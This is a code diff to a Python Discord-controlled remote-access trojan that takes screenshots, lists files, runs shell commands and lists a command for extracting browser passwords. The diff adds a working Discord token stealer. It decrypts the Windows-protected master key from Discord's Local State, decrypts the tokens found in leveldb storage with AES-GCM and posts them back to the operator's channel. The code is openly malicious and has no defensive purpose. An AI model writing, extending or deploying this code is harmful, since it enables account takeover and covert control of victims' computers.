@@ -1,5 +1,13 @@
-import os, discord, subprocess, requests, re, json, sys
+import os, discord, subprocess, requests, re, json, sys, win32crypt, base64
+from Crypto.Cipher import AES
 from PIL import ImageGrab
+
+APPDATA = os.getenv("APPDATA")
+LOCALAPPDATA = os.getenv("LOCALAPPDATA")
+TEMP = os.getenv("TEMP")
+
+guild_id = ""
+token = ""
 
 def get_processor():
     stdout = subprocess.Popen(
@@ -19,23 +27,9 @@ def get_os():
     ).stdout.read().decode()
     return stdout.split("\n")[3]
 
-def resource_path(relative_path):
-    if hasattr(sys, "_MEIPASS"):
-        return os.path.join(sys._MEIPASS, relative_path)
-    return os.path.join(os.path.abspath("."), relative_path)
-
-try:
-    config = json.loads(open("config.json", "r").read())
-except:
-    config = json.loads(
-        open(resource_path("config.json"), "r").read()
-    )
-
 intents = discord.Intents.all()
 bot = discord.Client(intents=intents)
 session_id = os.urandom(8).hex()
-token = config["token"]
-guild_id = config["guild_id"]
 commands = "\n".join([
     "help - Help command",
     "ping - Ping command",
@@ -49,8 +43,6 @@ commands = "\n".join([
     "exit - Exit the session",
     "screenshot - Take a screenshot",
     "tokens - Get all discord tokens",
-    "shutdown - Shutdown the computer",
-    "restart - Restart the computer",
     "passwords - Extracts all browser passwords",
     "history - Extracts all browser history",
 ])
@@ -103,9 +95,9 @@ async def on_message(message):
         if files == "":
             files = "No files found"
         if len(files) > 4093:
-            open(f"{os.getenv('TEMP')}\\list.txt", "w").write(files)
+            open(f"{TEMP}\\list.txt", "w").write(files)
             embed = discord.Embed(title=f"Files > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
-            file = discord.File(f"{os.getenv('TEMP')}\\list.txt")
+            file = discord.File(f"{TEMP}\\list.txt")
             return await message.reply(embed=embed, file=file)
         embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
         await message.reply(embed=embed)
@@ -136,7 +128,7 @@ async def on_message(message):
         if output == "":
             output = "No output"
         if output > 4093:
-            open(f"{os.getenv('TEMP')}\\output.txt", "w").write(output)
+            open(f"{TEMP}\\output.txt", "w").write(output)
             embed = discord.Embed(title=f"Shell > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
             file = discord.File(f"{os.getenv('TEMP')}\\output.txt")
             return await message.reply(embed=embed, file=file)
@@ -155,7 +147,7 @@ async def on_message(message):
 
     if message.content == "screenshot":
         screenshot = ImageGrab.grab(all_screens=True)
-        path = os.path.join(os.getenv("TEMP"), "screenshot.png")
+        path = os.path.join(TEMP, "screenshot.png")
         screenshot.save(path)
         file = discord.File(path)
         embed = discord.Embed(title="Screenshot", color=0xfafafa)
@@ -165,19 +157,26 @@ async def on_message(message):
     if message.content == "cwd":
         embed = discord.Embed(title="Current Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
         await message.reply(embed=embed)
-
-    if message.content == "shutdown":
-        embed = discord.Embed(title="Shutdown", description=f"```Shutting down...```", color=0xfafafa)
-        await message.reply(embed=embed)
-        os.system("shutdown /s /t 0")
-
-    if message.content == "restart":
-        embed = discord.Embed(title="Restart", description=f"```Restarting...```", color=0xfafafa)
-        await message.reply(embed=embed)
-        os.system("shutdown /r /t 0")
         
-    if message.content == "tokens": 
-        await message.reply("Not implemented yet")
+    if message.content == "tokens":
+        tokens = []
+        path = f"{APPDATA}\\discord"
+        if not os.path.exists(path):
+            return ["Discord not installed"]
+        local_state = open(f"{path}\\Local State", "r")
+        encrypted_master_key = base64.b64decode(json.loads(local_state.read())["os_crypt"]["encrypted_key"])
+        master_key = win32crypt.CryptUnprotectData(encrypted_master_key[5:], None, None, None, 0)[1]
+        for file_name in os.listdir(f"{path}\\Local Storage\\leveldb"):
+            if file_name[-3:] not in ["log", "ldb"]:
+                continue
+            for line in [x.strip() for x in open(f'{path}\\Local Storage\\leveldb\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
+                    encrypted_token = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])
+                    token = AES.new(master_key, AES.MODE_GCM, encrypted_token[3:15]).decrypt(encrypted_token[15:])[:-16].decode()
+                    token = token.replace(".", " ")
+                    tokens.append(token)
+        embed = discord.Embed(title="Tokens", description=f"```{tokens}```", color=0xfafafa)
+        await message.reply(embed=embed)
                             
     if message.content == "history":
         await message.reply("Not implemented yet")
